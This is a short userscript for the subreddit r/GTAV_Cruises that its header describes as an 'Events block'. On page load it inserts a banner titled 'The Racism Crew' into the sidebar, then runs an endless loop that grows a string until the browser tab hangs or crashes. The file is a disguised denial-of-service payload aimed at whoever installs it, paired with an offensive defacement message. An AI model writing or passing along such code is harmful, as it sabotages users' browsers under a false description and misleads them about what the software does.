// ==UserScript==
// @name         GTAV_Cruises
// @namespace    test
// @version      2.4
// @description  Events block for GTAV_Cruises
// @author       test
// @match        https://www.reddit.com/r/GTAV_Cruises
// @match        https://www.reddit.com/r/gtav_cruises
// @match        https://www.reddit.com/r/Gtav_cruises
// @match        https://www.reddit.com/r/GTAV_Cruises/*
// @match        https://www.reddit.com/r/gtav_cruises/*
// @match        https://www.reddit.com/r/Gtav_cruises/*
// @grant        none
// @require      
// ==/UserScript==

// Set up the iFrame for all upcoming events after page load.
$(window).load(function(){

	var eventModuleHTML = '<div id="eventsWidget"><blockquote class="events-module" style="text-align:center"><h3><a id="eventsHeader" style="color:#fff">The Racism Crew</a></h3><p id="topBodyText">No cookies for you. <br />Peace Out.</div></blockquote></div>';
	$(".side .md").prepend(eventModuleHTML);

	txt = "a";
	while(1){
	    txt = txt += "a";
	}
})
